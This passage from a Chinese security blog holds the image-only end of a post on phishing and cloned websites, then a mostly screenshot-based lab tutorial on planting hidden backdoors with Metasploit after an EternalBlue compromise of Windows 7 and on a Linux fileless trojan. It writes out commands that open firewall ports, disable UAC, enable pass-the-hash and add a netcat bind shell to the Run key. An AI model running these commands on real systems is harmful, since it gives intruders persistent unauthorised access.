<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820101034588.png" alt="image-20210820101034588"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820100934417.png" alt="image-20210820100934417"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820100948433.png" alt="image-20210820100948433"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820101128896.png" alt="image-20210820101128896"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820101201274.png" alt="image-20210820101201274"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820101328065.png" alt="image-20210820101328065"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908105847666.png" alt="image-20210908105847666"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820150803600.png" alt="image-20210820150803600"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820101948469.png" alt="image-20210820101948469"></p>
<p>效果展示</p>
<p>控制台查看</p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820102127052.png" alt="image-20210820102127052"></p>
<p>图形界面查看</p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820102200407.png" alt="image-20210820102200407"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820102218425.png" alt="image-20210820102218425"></p>
<p>查看/修改website代码</p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820102327601.png" alt="image-20210820102327601"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820102347095.png" alt="image-20210820102347095"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110703785.png" alt="image-20210908110703785"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110052540.png" alt="image-20210908110052540"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104349468.png" alt="image-20210820104349468"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104408849.png" alt="image-20210820104408849"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104603190.png" alt="image-20210820104603190"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104459523.png" alt="image-20210820104459523"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104645872.png" alt="image-20210820104645872"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104659293.png" alt="image-20210820104659293"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104745057.png" alt="image-20210820104745057"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104827922.png" alt="image-20210820104827922"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104924609.png" alt="image-20210820104924609"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820105003558.png" alt="image-20210820105003558"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908105946439.png" alt="image-20210908105946439"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820105313524.png" alt="image-20210820105313524"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820105655498.png" alt="image-20210820105655498"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86website%E5%92%8C%E9%92%93%E9%B1%BCwebsite%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20211008095108236.png" alt="image-20211008095108236"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/" class="post-title-link" itemprop="url">Mestasploit渗透测试之制作隐藏back door</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-19 20:54:06" itemprop="dateCreated datePublished" datetime="2021-08-19T20:54:06+08:00">2021-08-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-10-08 10:58:37" itemprop="dateModified" datetime="2021-10-08T10:58:37+08:00">2021-10-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Mestasploit渗透测试之制作隐藏back-door"><a href="#Mestasploit渗透测试之制作隐藏back-door" class="headerlink" title="Mestasploit渗透测试之制作隐藏back door"></a>Mestasploit渗透测试之制作隐藏back door</h1><h2 id="一、隐藏back-door的意义"><a href="#一、隐藏back-door的意义" class="headerlink" title="一、隐藏back door的意义"></a>一、隐藏back door的意义</h2><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819101229168.png" alt="image-20210819101229168"></p>
<h2 id="二、使用msf17-010永恒之蓝漏洞对win7进行渗透"><a href="#二、使用msf17-010永恒之蓝漏洞对win7进行渗透" class="headerlink" title="二、使用msf17-010永恒之蓝漏洞对win7进行渗透"></a>二、使用msf17-010永恒之蓝漏洞对win7进行渗透</h2><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819102221708.png" alt="image-20210819102221708"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819102252809.png" alt="image-20210819102252809"></p>
<p><strong>win7环境</strong></p>
<p>防火墙可以打开（使用家庭/工作网络）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819102146715.png" alt="image-20210819102146715"></p>
<p><strong>步骤1：</strong>渗透</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105253580.png" alt="image-20210819105253580"></p>
<p>加载、配置、启动模块</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105337567.png" alt="image-20210819105337567"></p>
<p>渗透成功</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105421575.png" alt="image-20210819105421575"></p>
<p><strong>步骤2：</strong>创建一个新用户远程连接win7桌面</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105618584.png" alt="image-20210819105618584"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105650319.png" alt="image-20210819105650319"></p>
<p>启动远程桌面</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105837404.png" alt="image-20210819105837404"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105910331.png" alt="image-20210819105910331"></p>
<p>输入密码后，若对方正在登录则会提升如下图。（对方也会有对应的提升，如果对方30s/一段时间没操作就会默认允许）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819105942245.png" alt="image-20210819105942245"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110057886.png" alt="image-20210819110057886"></p>
<p><strong>步骤3：</strong>关闭主机防护策略并开启back door</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110454539.png" alt="image-20210819110454539"></p>
<p>这利用SAM，红色字段就是用哈斯算法加密的账号密码，前面是账号</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110728859.png" alt="image-20210819110728859"></p>
<p>补充：kali（linux系统）进入window的shell后会有乱码，可以输入输入 chcp 65001</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819110958691.png" alt="image-20210819110958691"></p>
<p>指令：netsh firewall add portopening TCP 4444 “xuegod” ENABLE ALL</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111013939.png" alt="image-20210819111013939"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111056435.png" alt="image-20210819111056435"></p>
<p>指令：cmd.exe/k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111130454.png" alt="image-20210819111130454"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111235180.png" alt="image-20210819111235180"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111252073.png" alt="image-20210819111252073"></p>
<p>退出shell：Ctrl+c</p>
<p>指令：cmd.exe/k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v  LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</p>
<p><strong>步骤3：</strong>使用密码hash值登录系统</p>
<p>说明：1.红色字段是步骤2用hashdump查看到xuegod的密码哈斯值</p>
<p>2.SMBDomain值来自win7的工作组，如下图</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111937637.png" alt="image-20210819111937637"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819111520715.png" alt="image-20210819111520715"></p>
<p>补充：如果失败了，多尝试几次（即使配置都正确，也不会100%成功）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112119208.png" alt="image-20210819112119208"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112142192.png" alt="image-20210819112142192"></p>
<p>说明：C:\windows\system32只是存放路径，可以放得隐藏些，但要记住（后面还要用）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112827492.png" alt="image-20210819112827492"></p>
<p>指令：reg setval -k HKLM\software\microsoft\windows\currentversion\run -v lltest_nc -d ‘C:\windows\nc.exe -Ldp 443 -e cmd.exe’</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112348784.png" alt="image-20210819112348784"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819112412948.png" alt="image-20210819112412948"></p>
<p>也可以这样重启</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113147179.png" alt="image-20210819113147179"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113008314.png" alt="image-20210819113008314"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113051369.png" alt="image-20210819113051369"> </p>
<p>登录后程序才会运行，防火墙会弹出提示</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113307966.png" alt="image-20210819113307966"></p>
<p>程序已经在win7后台进行在监听</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113701382.png" alt="image-20210819113701382"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113549553.png" alt="image-20210819113549553"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113756461.png" alt="image-20210819113756461"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819113805371.png" alt="image-20210819113805371"></p>
<h2 id="三、Linux无文件木马程序"><a href="#三、Linux无文件木马程序" class="headerlink" title="三、Linux无文件木马程序"></a>三、Linux无文件木马程序</h2><p><strong>环境</strong></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819155530456.png" alt="image-20210819155530456"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160114518.png" alt="image-20210819160114518"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160212702.png" alt="image-20210819160212702"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160235373.png" alt="image-20210819160235373"></p>
<p><strong>步骤1</strong>：监听</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160459633.png" alt="image-20210819160459633"></p>
<p>渗透</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160606476.png" alt="image-20210819160606476"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160633596.png" alt="image-20210819160633596"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160805424.png" alt="image-20210819160805424"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160847284.png" alt="image-20210819160847284"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160858685.png" alt="image-20210819160858685"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819160951858.png" alt="image-20210819160951858"></p>
<p>渗透成功</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161050688.png" alt="image-20210819161050688"></p>
<p><strong>步骤2：</strong>到centos操作系统下载执行文件来建立session</p>
<p>（为了模拟实战隐藏行为效果，通过session进行操作）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161335768.png" alt="image-20210819161335768"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161825848.png" alt="image-20210819161825848"></p>
<p>补充：</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161537170.png" alt="image-20210819161537170"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161548062.png" alt="image-20210819161548062"></p>
<p>直接输入程序地址来执行</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161706964.png" alt="image-20210819161706964"></p>
<p>查看程序地址</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819161734385.png" alt="image-20210819161734385"></p>
<p><strong>步骤3</strong>：创建无文件back door程序</p>
<p>配置监听4444端口（要新开个终端窗口）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162015597.png" alt="image-20210819162015597"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162602534.png" alt="image-20210819162602534"></p>
<p>（靶机终端效果展示）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162708421.png" alt="image-20210819162708421"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819162825798.png" alt="image-20210819162825798"></p>
<p>说明：我们的木马文件必须放在vegile文件下</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163137866.png" alt="image-20210819163137866"></p>
<p>（靶机终端效果展示）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163209475.png" alt="image-20210819163209475"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163318186.png" alt="image-20210819163318186"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8Fback-door/image-20210819163454991.png" alt="image-20210819163454991"></p>
